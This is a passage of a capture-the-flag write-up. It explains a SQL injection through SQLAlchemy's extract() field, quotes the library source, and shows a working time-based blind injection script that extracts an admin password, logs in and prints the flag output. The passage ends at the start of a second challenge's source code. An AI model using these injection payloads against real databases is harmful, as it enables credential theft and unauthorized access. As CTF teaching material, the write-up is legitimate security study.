+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">138</span><span>        <span style="color:#66d9ef">with</span> Session(engine) <span style="color:#66d9ef">as</span> session:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">139</span><span>            user_data <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>query(
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">140</span><span>                User<span style="color:#f92672">.</span>username,
+</span></span><span style="display:flex; background-color:#3c3d38"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">141</span><span>                extract(field, User<span style="color:#f92672">.</span>timestamp)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">142</span><span>            )<span style="color:#f92672">.</span>where(User<span style="color:#f92672">.</span>username <span style="color:#f92672">==</span> username)<span style="color:#f92672">.</span>first()
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">143</span><span>            <span style="color:#66d9ef">return</span> str(user_data)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">144</span><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span>:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">145</span><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;something went wrong&#34;</span>
+</span></span></code></pre></div><p>Looking at documentation, it says the following.</p>
+<blockquote>
+<p>This field is used as a literal SQL string. DO NOT PASS UNTRUSTED INPUT TO THIS STRING.</p>
+<p><a href="https://docs.sqlalchemy.org/en/20/core/sqlelement.html#sqlalchemy.sql.expression.extract">https://docs.sqlalchemy.org/en/20/core/sqlelement.html#sqlalchemy.sql.expression.extract</a></p>
+</blockquote>
+<p>The source code of extract function is in the following.</p>
+<p><a href="https://github.com/sqlalchemy/sqlalchemy/blob/rel_2_0_43/lib/sqlalchemy/sql/compiler.py#L2939">https://github.com/sqlalchemy/sqlalchemy/blob/rel_2_0_43/lib/sqlalchemy/sql/compiler.py#L2939</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2939</span><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">visit_extract</span>(self, extract, <span style="color:#f92672">**</span>kwargs):
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2940</span><span>        field <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>extract_map<span style="color:#f92672">.</span>get(extract<span style="color:#f92672">.</span>field, extract<span style="color:#f92672">.</span>field)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2941</span><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;EXTRACT(</span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> FROM </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">)&#34;</span> <span style="color:#f92672">%</span> (
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2942</span><span>            field,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2943</span><span>            extract<span style="color:#f92672">.</span>expr<span style="color:#f92672">.</span>_compiler_dispatch(self, <span style="color:#f92672">**</span>kwargs),
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2944</span><span>        )
+</span></span></code></pre></div><p>User input is used in EXTRACT statement without restrictions(including sanitizing) so it is possible to inject arbitary query. To see the output, change the source code like this.</p>
+<p>app.py</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">138</span><span>        <span style="color:#66d9ef">with</span> Session(engine) <span style="color:#66d9ef">as</span> session:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">139</span><span>            stmt <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>query(
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">140</span><span>                User<span style="color:#f92672">.</span>username,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">141</span><span>                extract(field, User<span style="color:#f92672">.</span>timestamp)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">142</span><span>            )<span style="color:#f92672">.</span>where(User<span style="color:#f92672">.</span>username <span style="color:#f92672">==</span> username)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">143</span><span>            <span style="color:#66d9ef">return</span> str(stmt)
+</span></span></code></pre></div><p>The output is in the following.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>curl -XPOST http://localhost:3000/info -d <span style="color:#e6db74">&#39;username=admin&amp;field=hoge&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>SELECT user.username AS user_username, EXTRACT<span style="color:#f92672">(</span>hoge FROM user.timestamp<span style="color:#f92672">)</span> AS anon_1
+</span></span><span style="display:flex;"><span>FROM user
+</span></span><span style="display:flex;"><span>WHERE user.username <span style="color:#f92672">=</span> %<span style="color:#f92672">(</span>username_1<span style="color:#f92672">)</span>s
+</span></span></code></pre></div><p>With these information, it is possible to escape from current statement like the following query.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">YEAR</span> <span style="color:#66d9ef">FROM</span> <span style="color:#66d9ef">user</span>.<span style="color:#66d9ef">timestamp</span>), YOUR QUERY HERE, <span style="color:#66d9ef">EXTRACT</span>(<span style="color:#66d9ef">year</span>
+</span></span></code></pre></div><h2 id="solution">Solution</h2>
+<p>Here is solver</p>
+<p>solve.py</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">import</span> argparse
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> string
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">parse_args</span>():
+</span></span><span style="display:flex;"><span>    parser <span style="color:#f92672">=</span> argparse<span style="color:#f92672">.</span>ArgumentParser(conflict_handler<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;resolve&#34;</span>)
+</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;-u&#34;</span>, <span style="color:#e6db74">&#34;--url&#34;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;base url of the app&#34;</span>, type<span style="color:#f92672">=</span>str, required<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> parser<span style="color:#f92672">.</span>parse_args()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">bruteforce</span>(base_url, target_user, digit):
+</span></span><span style="display:flex;"><span>    target_column <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;password&#34;</span>
+</span></span><span style="display:flex;"><span>    target_table <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;user&#34;</span>
+</span></span><span style="display:flex;"><span>    sleep_duration <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> string<span style="color:#f92672">.</span>ascii_letters <span style="color:#f92672">+</span> string<span style="color:#f92672">.</span>digits:
+</span></span><span style="display:flex;"><span>        query <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;YEAR FROM user.timestamp), (SELECT 1 FROM (SELECT IF(SUBSTR((SELECT </span><span style="color:#e6db74">{</span>target_column<span style="color:#e6db74">}</span><span style="color:#e6db74"> FROM </span><span style="color:#e6db74">{</span>target_table<span style="color:#e6db74">}</span><span style="color:#e6db74"> WHERE username = &#39;</span><span style="color:#e6db74">{</span>target_user<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;),</span><span style="color:#e6db74">{</span>digit<span style="color:#e6db74">}</span><span style="color:#e6db74">,1) = &#39;</span><span style="color:#e6db74">{</span>c<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;,sleep(</span><span style="color:#e6db74">{</span>sleep_duration<span style="color:#e6db74">}</span><span style="color:#e6db74">),0))x), EXTRACT(year&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>            requests<span style="color:#f92672">.</span>post(base_url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/info&#34;</span>, headers<span style="color:#f92672">=</span>{
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;Content-Type&#34;</span>: <span style="color:#e6db74">&#34;application/x-www-form-urlencoded&#34;</span>
+</span></span><span style="display:flex;"><span>            }, data<span style="color:#f92672">=</span>{
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;username&#34;</span>: <span style="color:#e6db74">&#34;admin&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;field&#34;</span>: query
+</span></span><span style="display:flex;"><span>            }, timeout<span style="color:#f92672">=</span>sleep_duration <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> c
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    args <span style="color:#f92672">=</span> parse_args()
+</span></span><span style="display:flex;"><span>    base_url <span style="color:#f92672">=</span> args<span style="color:#f92672">.</span>url
+</span></span><span style="display:flex;"><span>    password_len <span style="color:#f92672">=</span> <span style="color:#ae81ff">32</span>
+</span></span><span style="display:flex;"><span>    username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;admin&#34;</span>
+</span></span><span style="display:flex;"><span>    password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(password_len):
+</span></span><span style="display:flex;"><span>        c <span style="color:#f92672">=</span> bruteforce(base_url, username, i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> c:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>        password <span style="color:#f92672">+=</span> c
+</span></span><span style="display:flex;"><span>        print(password)
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;password: </span><span style="color:#e6db74">{</span>password<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    user <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>Session()
+</span></span><span style="display:flex;"><span>    user<span style="color:#f92672">.</span>post(base_url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/login&#34;</span>, headers<span style="color:#f92672">=</span>{
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Content-Type&#34;</span>: <span style="color:#e6db74">&#34;application/x-www-form-urlencoded&#34;</span>
+</span></span><span style="display:flex;"><span>    }, data<span style="color:#f92672">=</span>{
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;username&#34;</span>: username,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;password&#34;</span>: password
+</span></span><span style="display:flex;"><span>    })
+</span></span><span style="display:flex;"><span>    res <span style="color:#f92672">=</span> user<span style="color:#f92672">.</span>get(base_url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/flag&#34;</span>)
+</span></span><span style="display:flex;"><span>    print(res<span style="color:#f92672">.</span>text)
+</span></span></code></pre></div><pre tabindex="0"><code>python3 solve.py -u http://localhost:3000
+
+a
+ac
+ac7
+ac7d
+ac7d8
+ac7d84
+ac7d84a
+ac7d84ac
+ac7d84acb
+ac7d84acb9
+ac7d84acb9e
+ac7d84acb9ec
+ac7d84acb9ecc
+ac7d84acb9eccd
+ac7d84acb9eccd7
+ac7d84acb9eccd79
+ac7d84acb9eccd793
+ac7d84acb9eccd7933
+ac7d84acb9eccd79332
+ac7d84acb9eccd79332c
+ac7d84acb9eccd79332c6
+ac7d84acb9eccd79332c6d
+ac7d84acb9eccd79332c6d9
+ac7d84acb9eccd79332c6d92
+ac7d84acb9eccd79332c6d926
+ac7d84acb9eccd79332c6d926f
+ac7d84acb9eccd79332c6d926f2
+ac7d84acb9eccd79332c6d926f2a
+ac7d84acb9eccd79332c6d926f2a9
+ac7d84acb9eccd79332c6d926f2a97
+ac7d84acb9eccd79332c6d926f2a97f
+ac7d84acb9eccd79332c6d926f2a97fe
+password: ac7d84acb9eccd79332c6d926f2a97fe
+sknb{REDACTED}
+</code></pre><h2 id="trivia">Trivia</h2>
+<p>This extract function&rsquo;s behavior can be found in certain databases. SQL Alchemy supports multiple databases, so each behavior is slightly different. For instance, SQLite&rsquo;s extract function doesn&rsquo;t allow SQL Injection since only the characters defined in extract_map are allowed.</p>
+<p><a href="https://github.com/sqlalchemy/sqlalchemy/blob/rel_2_0_43/lib/sqlalchemy/dialects/sqlite/base.py#L1466">https://github.com/sqlalchemy/sqlalchemy/blob/rel_2_0_43/lib/sqlalchemy/dialects/sqlite/base.py#L1466</a></p>
+<div class="highlight" linestartno="1466"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">visit_extract</span>(self, extract, <span style="color:#f92672">**</span>kw):
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;CAST(STRFTIME(&#39;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;, </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">) AS INTEGER)&#34;</span> <span style="color:#f92672">%</span> (
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>                self<span style="color:#f92672">.</span>extract_map[extract<span style="color:#f92672">.</span>field],
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>                self<span style="color:#f92672">.</span>process(extract<span style="color:#f92672">.</span>expr, <span style="color:#f92672">**</span>kw),
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>            )
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">KeyError</span> <span style="color:#66d9ef">as</span> err:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>            <span style="color:#66d9ef">raise</span> exc<span style="color:#f92672">.</span>CompileError(
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>                <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> is not a valid extract argument.&#34;</span> <span style="color:#f92672">%</span> extract<span style="color:#f92672">.</span>field
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>            ) <span style="color:#f92672">from</span> err
+</span></span></code></pre></div><p><a href="https://github.com/sqlalchemy/sqlalchemy/blob/rel_2_0_43/lib/sqlalchemy/dialects/sqlite/base.py#L1419">https://github.com/sqlalchemy/sqlalchemy/blob/rel_2_0_43/lib/sqlalchemy/dialects/sqlite/base.py#L1419</a></p>
+<div class="highlight" linestartno="1419"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span>    extract_map <span style="color:#f92672">=</span> util<span style="color:#f92672">.</span>update_copy(
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>        compiler<span style="color:#f92672">.</span>SQLCompiler<span style="color:#f92672">.</span>extract_map,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>        {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>            <span style="color:#e6db74">&#34;month&#34;</span>: <span style="color:#e6db74">&#34;%m&#34;</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>            <span style="color:#e6db74">&#34;day&#34;</span>: <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%d</span><span style="color:#e6db74">&#34;</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>            <span style="color:#e6db74">&#34;year&#34;</span>: <span style="color:#e6db74">&#34;%Y&#34;</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>            <span style="color:#e6db74">&#34;second&#34;</span>: <span style="color:#e6db74">&#34;%S&#34;</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>            <span style="color:#e6db74">&#34;hour&#34;</span>: <span style="color:#e6db74">&#34;%H&#34;</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>            <span style="color:#e6db74">&#34;doy&#34;</span>: <span style="color:#e6db74">&#34;%j&#34;</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>            <span style="color:#e6db74">&#34;minute&#34;</span>: <span style="color:#e6db74">&#34;%M&#34;</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>            <span style="color:#e6db74">&#34;epoch&#34;</span>: <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>            <span style="color:#e6db74">&#34;dow&#34;</span>: <span style="color:#e6db74">&#34;%w&#34;</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>            <span style="color:#e6db74">&#34;week&#34;</span>: <span style="color:#e6db74">&#34;%W&#34;</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>        },
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>    )
+</span></span></code></pre></div><h1 id="auth-delegation">Auth Delegation</h1>
+<p>The following is the challenge source code.</p>
+<p>app/src/index.js</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">crypto</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;crypto&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">express</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;express&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">session</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;express-session&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">passport</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;passport&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">app</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">express</span>();
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">port</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">3000</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">set</span>(<span style="color:#e6db74">&#34;view engine&#34;</span>, <span style="color:#e6db74">&#34;ejs&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#a6e22e">express</span>.<span style="color:#a6e22e">urlencoded</span>(
+</span></span><span style="display:flex;"><span>    { <span style="color:#a6e22e">extended</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">false</span> }
+</span></span><span style="display:flex;"><span>));
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#a6e22e">session</span>({
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">secret</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">crypto</span>.<span style="color:#a6e22e">randomBytes</span>(<span style="color:#ae81ff">64</span>).<span style="color:#a6e22e">toString</span>(<span style="color:#e6db74">&#34;hex&#34;</span>),
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">resave</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">saveUninitialized</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">false</span>,
+</span></span><span style="display:flex;"><span>}));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#a6e22e">passport</span>.<span style="color:#a6e22e">initialize</span>());
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#a6e22e">passport</span>.<span style="color:#a6e22e">session</span>());
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#e6db74">&#34;/&#34;</span>, <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;./routes/index&#34;</span>));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">listen</span>(<span style="color:#a6e22e">port</span>, <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`app is running on port </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">port</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>));
+</span></span></code></pre></div><p>app/src/routes/index.js</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">express</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;express&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">passport</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;passport&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">LocalStrategy</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;passport-local&#34;</span>).<span style="color:#a6e22e">Strategy</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">router</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">express</span>.<span style="color:#a6e22e">Router</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">waf</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>, <span style="color:#a6e22e">next</span>) =&gt; {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> { <span style="color:#a6e22e">username</span> } <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">username</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">next</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>  }
